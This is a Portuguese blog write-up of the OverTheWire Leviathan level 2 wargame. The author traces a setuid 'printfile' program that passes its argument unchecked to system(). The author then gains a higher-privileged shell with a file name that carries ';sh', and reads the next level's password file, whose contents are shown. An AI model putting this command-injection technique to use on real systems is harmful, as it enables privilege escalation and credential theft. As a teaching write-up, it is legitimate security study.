---
layout: default
title: Level 2 - Command Injection [OverTheWire CTF – Leviathan] write-up
date: 2016-11-06 18:44
author: brennords
comments: true
categories: [CTFs]
---
<ul>
    <li><a href="https://brenn0.wordpress.com/2016/11/02/level-1-overthewire-ctf-leviathan-write-up/">Level 0</a></li>
    <li><a href="https://brenn0.wordpress.com/2016/11/02/level-1-overthewire-ctf-leviathan-write-up/" target="_blank" rel="noopener">Level 1</a></li>
</ul>

E agora é hora do Level 2.

<blockquote>
Obs: como já explico umas merdas básicas nos write-ups dos levels anteriores, vou evitar ficar repetindo para que serve um ltrace e só explicar o que for surgindo de novo.
</blockquote>

Logado no ssh como leviathan2, encontrei o arquivo <strong>printfile</strong> na minha home. Era o alvo da vez.

```leviathan2@melinda:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
```

O executável faz juz ao nome e, pelo que é descrito, deve imprimir um arquivo na tela. Como em todos os nívels, o arquivo roda com permissões do user acima do meu, ou seja, leviathan3, então é óbvio que tentei fazer com ele lesse o arquivo que continha o password do próximo nível, pois leviathan3 pode, eu não.

```
leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Why not? :( Essa porra tava aparentando ser simples demais.

```
leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852d, 2, 0xffffd664, 0x8048600 unfinished ...
access(/etc/leviathan_pass/leviathan3, 4) = -1
puts(You cant have that file...You cant have that file...
) = 27
+++ exited (status 1) +++
```

A função access retorna -1 quando tento ler o pass de leviathan3, com certeza isso não significa coisa boa para o meu lado. Não conhecia a função <strong>access </strong>e o máximo que encontrei foi a <a href="https://linux.die.net/man/2/access" target="_blank" rel="noopener">man page</a>. Mas foi suficiente, a descrição do que ela fazia era simples e direta: checar as permissões reais do usuário que tenta acessar um arquivo.

Logo, o printfile ser executado com permissões de leviathan3 não me permite ler arquivos que pertecem ao mesmo porque a função acess sempre vai detectar que sou leviathan2 e me falar que não posso ter determinado arquivo.

Certo, será preciso enganar esse programa de alguma forma. Primeira coisa que fiz, foi criar um arquivo (no único lugar que o ctf nos dá permissão de escrita, em <strong>/tmp</strong>) e observar o comportamento de printfile quando passo como argumento algo que tenho permissões de acesso.

```
leviathan2@melinda:~$ ltrace ./printfile /tmp/0211/fuck
__libc_start_main(0x804852d, 2, 0xffffd674, 0x8048600 unfinished ...
access(/tmp/0211/fuck, 4) = 0
snprintf(/bin/cat /tmp/0211/fuck, 511, /bin/cat %s, /tmp/0211/fuck) = 23
system(/bin/cat /tmp/0211/fuckfuck
no return ...
--- SIGCHLD (Child exited) ---
... system resumed) = 0
+++ exited (status 0) +++
```

A função access fica satisfeita e a string que é passada como argumento ganha um trato da função <a href="http://www.br-c.org/doku.php?id=snprintf">snprintf</a>. Então a string que vai para <a href="https://www.vivaolinux.com.br/dica/Usando-funcoes-do-sistema-em-C-com-system">system</a> fica sendo <em>/bin/cat nosso/argumento</em>. (Siga os links para entender sobre o que as funções fazem)

Nessa altura eu perdi algum tempo achando que a falha poderia estar na função access. Depois de algumas tentativas frustradas de tentar explora-la de alguma forma, decidi que ela não era o caminho.

Foi aí que prestei a atenção em <strong>snprintf</strong> e <strong>system</strong>.

```
snprintf(/bin/cat /tmp/0211/fuck, 511, /bin/cat %s, /tmp/0211/fuck) = 23
system(/bin/cat /tmp/0211/fuckfuck
```

Descrevendo de forma rústica: o programa, cegamente, pega o argumento, põe após <em>/bin/cat</em> e manda system executar. Vi então uma oportunidade para injetar comandos, afinal, system apenas executará a string e, se o programa não fizer uma validação em busca de um ponto e vírgula, por exemplo, teremos a capacidade de executar outro comando após o <em>/bin/cat</em>.

Decidi testar minha teoria criando um arquivo com o nome <strong>--help</strong>. Como não é uma prática nada comum criar arquivos com caracteres especiais (tipo ; e -), tive a ajuda disso <a href="http://www.tecmint.com/manage-linux-filenames-with-special-characters/">aqui</a> para lembrar de como cria-los.

```
leviathan2@melinda:/tmp/0211$ touch -- --help

leviathan2@melinda:/tmp/0211$ ltrace ../../home/leviathan2/printfile --help
__libc_start_main(0x804852d, 2, 0xffffd644, 0x8048600 unfinished ...
access(--help, 4) = 0
snprintf(/bin/cat --help, 511, /bin/cat %s, --help) = 15
system(/bin/cat --helpUsage: /bin/cat [OPTION]... [FILE]...
Concatenate FILE(s), or standard input, to standard output.

-A, --show-all equivalent to -vET
-b, --number-non... cortei os bla bla da mensagem de help do cat
no return ...
--- SIGCHLD (Child exited) ---
... system resumed) = 0
+++ exited (status 0) +++
```

<a href="https://www.owasp.org/index.php/Command_Injection">Command injection</a> verificado com sucesso. É possível executar o que se quiser e tudo com privilégios de leviathan3. E o que mais se quer? SHEEEELLLLLL.

```
leviathan2@melinda:/tmp/0211$ touch ';sh'
leviathan2@melinda:/tmp/0211$ ls
--help -h ;sh fuck leviathan3
leviathan2@melinda:/tmp/0211$ ../../home/leviathan2/printfile ;sh
*** File Printer ***
Usage: ../../home/leviathan2/printfile filename
$ whoami
leviathan2
$
```

Algo saiu errado... Mas é claro que saiu! Por não pôr o ;sh entre aspas simples, ao invés de passar como argumento, acabei executando o comando <em>sh</em> após a execução de printfile.

Hora de tentar novamente (dessa vez com o ltrace para ver se tudo corria bem):

```
leviathan2@melinda:/tmp/0211$ ltrace ../../home/leviathan2/printfile ';sh'
__libc_start_main(0x804852d, 2, 0xffffd644, 0x8048600 unfinished ...
access(;sh, 4) = 0
snprintf(/bin/cat ;sh, 511, /bin/cat %s, ;sh) = 12
system(/bin/cat ;sh

bash
bash
```

Ainda nada. Mas não foi dificil para perceber que ;sh agora estava virando argumento de cat e as coisas não saiam como esperado. Então criei um novo arquivo chamado <strong>fuck';sh'. </strong>Assim, cat iria ler o arquivo fuck e em seguida system iria executar sh.

```
leviathan2@melinda:/tmp/0211$ touch fuck';sh'
leviathan2@melinda:/tmp/0211$ ls
--help -h ;sh fuck fuck;sh leviathan3
leviathan2@melinda:/tmp/0211$ ../../home/leviathan2/printfile fuck';sh'
fuck
$ whoami
leviathan3
$ cat /etc/leviathan_pass/leviathan3
cXVlcmZsYWc/
```

Esse foi divertido.
